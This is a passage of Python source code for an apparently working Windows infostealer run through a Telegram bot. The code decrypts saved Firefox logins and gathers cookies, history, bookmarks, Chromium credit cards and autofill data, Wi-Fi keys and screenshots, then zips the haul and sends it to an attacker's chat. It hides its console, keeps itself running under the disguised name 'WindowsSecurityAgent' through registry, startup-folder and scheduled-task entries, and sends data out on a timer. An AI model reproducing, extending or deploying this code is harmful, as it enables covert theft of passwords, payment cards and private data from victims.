            conn.execute('PRAGMA wal_checkpoint(TRUNCATE)')
        except Exception:
            pass
        try:
            r = _q(conn.cursor())
        finally:
            conn.close()
        return r if r else (None, None)
    except Exception:
        return None, None
    finally:
        for suffix in ('', '-wal', '-shm'):
            try:
                (tmp.parent / (tmp.name + suffix)).unlink(missing_ok=True)
            except Exception:
                pass


def _ff_decrypt_field(b64_val, key, cipher_oid):
    try:
        blob = base64.b64decode(b64_val)
        _, outer, _ = _der_next(blob, 0)
        pos = 0
        _, ei, pos = _der_next(outer, pos)
        _, ct, _   = _der_next(outer, pos)
        pos = 0
        _, oid_r, pos = _der_next(ei, pos)
        _, iv, _      = _der_next(ei, pos)
        fo = _oid_str(oid_r)
        if fo == _OID_3DES or cipher_oid == _OID_3DES:
            plain = DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ct)
        else:
            plain = AES.new(key[:32], AES.MODE_CBC, iv).decrypt(ct)
        pad = plain[-1]
        if 1 <= pad <= 16:
            plain = plain[:-pad]
        return plain.decode('utf-8', errors='replace').strip('\x00')
    except Exception:
        return '[encrypted]'

# ====================== FIREFOX EXTRACTORS ========================


def get_firefox_passwords(profile):
    lj = profile / 'logins.json'
    if not lj.exists():
        return []
    key, oid = get_firefox_master_key(profile)
    passwords = []
    try:
        data = json.loads(lj.read_text(encoding='utf-8'))
        for login in data.get('logins', []):
            url = login.get('formSubmitURL') or login.get('hostname', '')
            eu = login.get('encryptedUsername', '')
            ep = login.get('encryptedPassword', '')
            if key:
                u = _ff_decrypt_field(eu, key, oid)
                p = _ff_decrypt_field(ep, key, oid)
            else:
                u = p = '[master password set]'
            tc = login.get('timeCreated')
            passwords.append({
                'url': url, 'username': u, 'password': p,
                'created': str(datetime.fromtimestamp(tc/1000)) if tc else '',
            })
    except Exception:
        pass
    return passwords


def get_firefox_cookies(profile):
    db = profile / 'cookies.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT host,name,value,path,expiry,isSecure,isHttpOnly '
                'FROM moz_cookies ORDER BY host')
            for host, name, val, path, exp, sec, httpo in cur.fetchall():
                rows.append({
                    'host': host, 'name': name, 'value': val or '',
                    'path': path,
                    'expires': str(datetime.fromtimestamp(exp)) if exp else '',
                    'secure': bool(sec), 'httponly': bool(httpo),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_firefox_history(profile):
    db = profile / 'places.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT url,title,visit_count,last_visit_date '
                'FROM moz_places ORDER BY last_visit_date DESC LIMIT 2000')
            for url, title, vc, lv in cur.fetchall():
                rows.append({
                    'url': url, 'title': title or '', 'visits': vc,
                    'last_visit': str(datetime.fromtimestamp(lv/1_000_000)) if lv else '',
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_firefox_bookmarks(profile):
    db = profile / 'places.sqlite'
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                'SELECT b.title, p.url, b.dateAdded '
                'FROM moz_bookmarks b '
                'INNER JOIN moz_places p ON b.fk = p.id '
                'WHERE b.type = 1 ORDER BY b.dateAdded DESC')
            for title, url, da in cur.fetchall():
                rows.append({
                    'name': title or '', 'url': url,
                    'added': str(datetime.fromtimestamp(da/1_000_000)) if da else '',
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)

# ========================= WIFI PASSWORDS =========================


def get_wifi_passwords():
    """Extract saved Wi-Fi passwords via netsh."""
    results = []
    try:
        out = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'],
            capture_output=True, text=True, timeout=15)
        profiles = []
        for line in out.stdout.splitlines():
            if 'All User Profile' in line or 'Current User Profile' in line:
                name = line.split(':',1)[1].strip()
                if name:
                    profiles.append(name)
        for name in profiles:
            try:
                detail = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'],
                    capture_output=True, text=True, timeout=10)
                password = ''
                auth = ''
                for line in detail.stdout.splitlines():
                    if 'Key Content' in line:
                        password = line.split(':',1)[1].strip()
                    elif 'Authentication' in line:
                        auth = line.split(':',1)[1].strip()
                results.append({
                    'ssid': name, 'password': password, 'auth': auth})
            except Exception:
                results.append({'ssid': name, 'password': '[error]', 'auth': ''})
    except Exception:
        pass
    return results

# ========================= SCREENSHOT =============================


def capture_screenshot():
    tmp = Path(tempfile.gettempdir()) / f'ss_{int(time.time())}.png'
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        img.save(str(tmp))
        return str(tmp)
    except ImportError:
        pass
    try:
        ps = (
            'Add-Type -AssemblyName System.Windows.Forms;'
            '$b=[System.Drawing.Bitmap]::new('
            '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,'
            '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);'
            '$g=[System.Drawing.Graphics]::FromImage($b);'
            '$g.CopyFromScreen(0,0,0,0,$b.Size);'
            f'$b.Save("{tmp}");'
        )
        r = subprocess.run(
            ['powershell', '-NoProfile', '-Command', ps],
            capture_output=True, timeout=15)
        if tmp.exists():
            return str(tmp)
    except Exception:
        pass
    return None

# ========================= DATA COLLECTION ========================


def collect_all():
    _kill_browsers()
    result = {
        'system':    system_info(),
        'browsers':  {},
        'wifi':      get_wifi_passwords(),
        'timestamp': datetime.now().isoformat(),
    }
    paths = find_browser_paths()
    for browser, path_or_list in paths.items():
        result['browsers'][browser] = {}
        try:
            is_ff = any(x in browser for x in ('firefox','librewolf','waterfox','thunderbird'))
            if is_ff:
                profiles = find_firefox_profiles(path_or_list)
                for prof in profiles:
                    result['browsers'][browser][prof.name] = {
                        'passwords': get_firefox_passwords(prof),
                        'cookies':   get_firefox_cookies(prof),
                        'history':   get_firefox_history(prof),
                        'bookmarks': get_firefox_bookmarks(prof),
                    }
            else:
                profiles = path_or_list
                browser_base = profiles[0].parent if profiles else None
                key = chromium_master_key(browser_base) if browser_base else None
                for prof in profiles:
                    result['browsers'][browser][prof.name] = {
                        'passwords':    get_chromium_passwords(prof, key, browser_base),
                        'cookies':      get_chromium_cookies(prof, key, browser_base),
                        'history':      get_chromium_history(prof),
                        'bookmarks':    get_chromium_bookmarks(prof),
                        'credit_cards': get_chromium_credit_cards(prof, key, browser_base),
                        'downloads':    get_chromium_downloads(prof),
                        'autofill':     get_chromium_autofill(prof),
                    }
        except Exception as e:
            result['browsers'][browser]['error'] = str(e)
    return result


def _count(data, key):
    n = 0
    for pdict in data['browsers'].values():
        for pdata in pdict.values():
            if isinstance(pdata, dict):
                n += len(pdata.get(key, []))
    return n


def make_zip(data):
    tmp_dir = Path(tempfile.mkdtemp())
    try:
        files = {}
        si = data['system']
        files['system_info.txt'] = '\n'.join(f'{k}: {v}' for k, v in si.items())
        files['full_data.json']  = json.dumps(data, indent=2, default=str)

        wifi = data.get('wifi', [])
        if wifi:
            txt = f'=== SAVED WI-FI PASSWORDS ({len(wifi)}) ===\n\n'
            for w in wifi:
                txt += (f"SSID:     {w['ssid']}\n"
                        f"Password: {w['password']}\n"
                        f"Auth:     {w['auth']}\n\n")
            files['wifi_passwords.txt'] = txt

        for browser, prof_dict in data['browsers'].items():
            for pname, pdata in prof_dict.items():
                if not isinstance(pdata, dict):
                    continue
                pfx = f'{browser}_{pname}'

                if pdata.get('passwords'):
                    txt = f'=== {browser.upper()} | {pname} PASSWORDS ===\n\n'
                    for p in pdata['passwords']:
                        txt += (f"URL:      {p['url']}\n"
                                f"Username: {p['username']}\n"
                                f"Password: {p['password']}\n"
                                f"Last used:{p.get('last_used','')}\n\n")
                    files[f'{pfx}_passwords.txt'] = txt

                if pdata.get('cookies'):
                    txt = f'=== {browser.upper()} | {pname} COOKIES ({len(pdata["cookies"])}) ===\n\n'
                    for c in pdata['cookies'][:500]:
                        txt += (f"Host:  {c['host']}\nName:  {c['name']}\n"
                                f"Value: {str(c.get('value',''))[:200]}\n\n")
                    files[f'{pfx}_cookies.txt'] = txt

                if pdata.get('history'):
                    txt = f'=== {browser.upper()} | {pname} HISTORY ({len(pdata["history"])}) ===\n\n'
                    for h in pdata['history'][:500]:
                        txt += (f"URL:   {h['url']}\nTitle: {h.get('title','')}\n"
                                f"Visits:{h.get('visits','')}\n"
                                f"Last:  {h.get('last_visit','')}\n\n")
                    files[f'{pfx}_history.txt'] = txt

                if pdata.get('bookmarks'):
                    txt = f'=== {browser.upper()} | {pname} BOOKMARKS ===\n\n'
                    for b in pdata['bookmarks']:
                        txt += (f"Name:   {b.get('name','')}\n"
                                f"URL:    {b.get('url','')}\n"
                                f"Folder: {b.get('folder','')}\n\n")
                    files[f'{pfx}_bookmarks.txt'] = txt

                if pdata.get('credit_cards'):
                    txt = f'=== {browser.upper()} | {pname} CREDIT CARDS ===\n\n'
                    for cc in pdata['credit_cards']:
                        txt += (f"Name:   {cc['name']}\nNumber: {cc['number']}\n"
                                f"Expiry: {cc['expiry']}\n\n")
                    files[f'{pfx}_credit_cards.txt'] = txt

                if pdata.get('downloads'):
                    txt = f'=== {browser.upper()} | {pname} DOWNLOADS ({len(pdata["downloads"])}) ===\n\n'
                    for d in pdata['downloads'][:200]:
                        txt += (f"URL:  {d.get('url','')}\nPath: {d.get('path','')}\n"
                                f"Date: {d.get('date','')}\n\n")
                    files[f'{pfx}_downloads.txt'] = txt

                if pdata.get('autofill'):
                    txt = f'=== {browser.upper()} | {pname} AUTOFILL ({len(pdata["autofill"])}) ===\n\n'
                    for a in pdata['autofill'][:200]:
                        txt += (f"Field: {a['field']}\nValue: {a['value']}\n"
                                f"Count: {a['count']}\n\n")
                    files[f'{pfx}_autofill.txt'] = txt

        for fname, content in files.items():
            (tmp_dir / fname).write_text(content, encoding='utf-8')

        hostname = si.get('hostname', 'win') or 'win'
        zip_name = f'win_{hostname}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.zip'
        zip_path = Path(tempfile.gettempdir()) / zip_name
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in tmp_dir.iterdir():
                zf.write(f, f.name)
        return zip_path
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

# ====================== COMMAND HANDLERS ==========================


def handle_command(text, chat_id):
    cmd  = text.split()[0].split('@')[0].lower().strip()
    args = text.split()[1:]

    if cmd in ('/start', '/help'):
        send_message(
            '<b>HackBrowserData — Windows Native</b>\n\n'
            '<b>Commands:</b>\n'
            '/extract    — Collect all browser data (ZIP)\n'
            '/info       — System information\n'
            '/browsers   — List detected browsers\n'
            '/wifi       — Saved Wi-Fi passwords\n'
            '/screenshot — Capture desktop\n'
            '/status     — Bot status + uptime\n'
            '/help       — This message', chat_id)

    elif cmd == '/extract':
        send_message('Collecting browser data...', chat_id)
        zp = None
        try:
            data = collect_all()
            zp   = make_zip(data)
            wifi_count = len(data.get('wifi', []))
            stats = (
                f'<b>Extraction complete</b>\n\n'
                f'<b>Host:</b>         {data["system"].get("hostname")}\n'
                f'<b>User:</b>         {data["system"].get("username")}\n'
                f'<b>Elevated:</b>     {data["system"].get("elevated")}\n'
                f'<b>Passwords:</b>    {_count(data,"passwords")}\n'
                f'<b>Cookies:</b>      {_count(data,"cookies")}\n'
                f'<b>History:</b>      {_count(data,"history")}\n'
                f'<b>Bookmarks:</b>    {_count(data,"bookmarks")}\n'
                f'<b>Credit cards:</b> {_count(data,"credit_cards")}\n'
                f'<b>Downloads:</b>    {_count(data,"downloads")}\n'
                f'<b>Autofill:</b>     {_count(data,"autofill")}\n'
                f'<b>Wi-Fi nets:</b>   {wifi_count}')
            send_message(stats, chat_id)
            send_file(str(zp), chat_id, 'Browser data')
        except Exception as e:
            send_message(f'Extraction error: {e}', chat_id)
        finally:
            if zp:
                zp.unlink(missing_ok=True)

    elif cmd == '/info':
        info = system_info()
        send_message(
            '<b>System Information:</b>\n' +
            '\n'.join(f'<b>{k}:</b> {v}' for k, v in info.items()), chat_id)

    elif cmd == '/browsers':
        send_message('Scanning...', chat_id)
        paths = find_browser_paths()
        if not paths:
            send_message('No browsers detected.', chat_id)
            return
        txt = f'<b>Browsers: {len(paths)}</b>\n\n'
        for b, p in paths.items():
            if isinstance(p, list):
                txt += f'<b>{b}</b> ({len(p)} profile(s))\n'
            else:
                txt += f'<b>{b}</b> (Firefox-based)\n'
        send_message(txt, chat_id)

    elif cmd == '/wifi':
        send_message('Extracting Wi-Fi passwords...', chat_id)
        wifi = get_wifi_passwords()
        if not wifi:
            send_message('No saved Wi-Fi networks found.', chat_id)
            return
        txt = f'<b>Wi-Fi Networks: {len(wifi)}</b>\n\n'
        for w in wifi:
            pw = w['password'] or '(open/no password)'
            txt += f"<b>{w['ssid']}</b>\n  Password: <code>{pw}</code>\n\n"
        send_message(txt, chat_id)

    elif cmd == '/screenshot':
        send_message('Capturing...', chat_id)
        path = capture_screenshot()
        if path:
            send_file(path, chat_id, 'Screenshot')
            try:
                os.unlink(path)
            except Exception:
                pass
        else:
            send_message('Screenshot failed.', chat_id)

    elif cmd == '/status':
        up = int(time.time() - _START)
        h, rem = divmod(up, 3600)
        m, s = divmod(rem, 60)
        send_message(
            f'<b>Status:</b> Running\n'
            f'<b>Platform:</b> Windows {platform.release()}\n'
            f'<b>Elevated:</b> {ctypes.windll.shell32.IsUserAnAdmin() != 0}\n'
            f'<b>Uptime:</b> {h}h {m}m {s}s\n'
            f'<b>Python:</b> {sys.version.split()[0]}\n'
            f'<b>Time:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
            chat_id)

    else:
        send_message(f'Unknown: <code>{cmd}</code> — use /help', chat_id)

# ========================= HIDE CONSOLE ===========================


def _hide_console():
    exe = sys.executable
    if not exe.lower().endswith('python.exe'):
        return
    pw = exe[:-10] + 'pythonw.exe'
    if not Path(pw).exists():
        return
    subprocess.Popen(
        [pw] + sys.argv,
        creationflags=0x00000008 | 0x08000000,
        close_fds=True)
    sys.exit(0)

# ========================= PERSISTENCE ============================


def install_persistence():
    script = str(Path(__file__).resolve())
    interp = sys.executable
    pw = interp
    if interp.lower().endswith('python.exe'):
        _pw = interp[:-10] + 'pythonw.exe'
        if Path(_pw).exists():
            pw = _pw
    cmd_line = f'"{pw}" "{script}"'

    try:
        import winreg
        k = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, 'WindowsSecurityAgent', 0, winreg.REG_SZ, cmd_line)
        winreg.CloseKey(k)
        return
    except Exception:
        pass

    try:
        startup = _RAD / r'Microsoft\Windows\Start Menu\Programs\Startup'
        startup.mkdir(parents=True, exist_ok=True)
        bat = startup / 'WindowsSecurityAgent.bat'
        bat.write_text(f'@echo off\nstart "" /MIN {cmd_line}\n', encoding='utf-8')
        return
    except Exception:
        pass

    try:
        subprocess.run(
            ['schtasks', '/Create', '/F', '/SC', 'ONLOGON',
             '/TN', 'WindowsSecurityAgent', '/TR', cmd_line, '/RL', 'HIGHEST'],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

# ========================= LOCK / BOT LOOP =======================


def _lock_path():
    return Path(tempfile.gettempdir()) / f'hbd_native_{os.environ.get("USERNAME","u")}.lock'


def _acquire_lock():
    lf = _lock_path()
    if lf.exists():
        try:
            pid = int(lf.read_text().strip())
            os.kill(pid, 0)
            return False
        except (OSError, ValueError):
            pass
    lf.write_text(str(os.getpid()))
    atexit.register(lambda: lf.unlink(missing_ok=True))
    return True


def _auto_extract():
    while True:
        time.sleep(CHECK_INTERVAL)
        try:
            data = collect_all()
            zp = make_zip(data)
            send_message(f'Scheduled extraction — {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
            send_file(str(zp), caption='Scheduled extraction')
            zp.unlink(missing_ok=True)
        except Exception as e:
            print(f'[auto] {e}')
            try:
                send_message(f'Scheduled extraction failed: {e}')
            except Exception:
                pass


def _drain_updates():
    try:
        r = requests.get(f'{_API}/getUpdates',
                         params={'timeout': 0, 'offset': -1}, timeout=10)
        data = r.json()
        if data.get('ok') and data.get('result'):
            return data['result'][-1]['update_id'] + 1
    except Exception:
        pass
    return None


def run_bot():
    delete_webhook()
    si = system_info()
    send_message(
        f'<b>Windows Bot Online</b>\n\n'
        f'<b>Host:</b>     {si["hostname"]}\n'
        f'<b>User:</b>     {si["username"]}\n'
        f'<b>OS:</b>       {si["platform"]}\n'
        f'<b>Elevated:</b> {si["elevated"]}\n'
        f'<b>Time:</b>     {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n\n'
        f'Use /help for commands.')

    offset = _drain_updates()
    errors = 0
    while True:
        updates = get_updates(offset)
        if updates is None:
            errors += 1
            time.sleep(min(2 ** errors, 120))
            if errors >= 5:
                delete_webhook(); errors = 0
            continue
        errors = 0
        for upd in updates.get('result', []):
            offset = upd['update_id'] + 1
            msg  = upd.get('message', {})
            text = msg.get('text', '')
            cid  = msg.get('chat', {}).get('id')
            if text.startswith('/') and cid:
                if not _is_authorized(cid):
                    send_message('Unauthorized.', cid)
                    continue
                try:
                    handle_command(text, cid)
                except Exception as e:
                    send_message(f'Error: {e}', cid)
        time.sleep(1)

# ============================= MAIN ===============================


def main():
    _hide_console()

    if not _acquire_lock():
        sys.exit(0)

    if AUTO_PERSIST:
        try:
            install_persistence()
        except Exception:
            pass

    if CHECK_INTERVAL > 0:
        threading.Thread(target=_auto_extract, daemon=True).start()

    while True:
        try:
            run_bot()
        except KeyboardInterrupt:
            send_message('Bot stopped.')
            break
        except Exception:
            time.sleep(60)


if __name__ == '__main__':
    main()
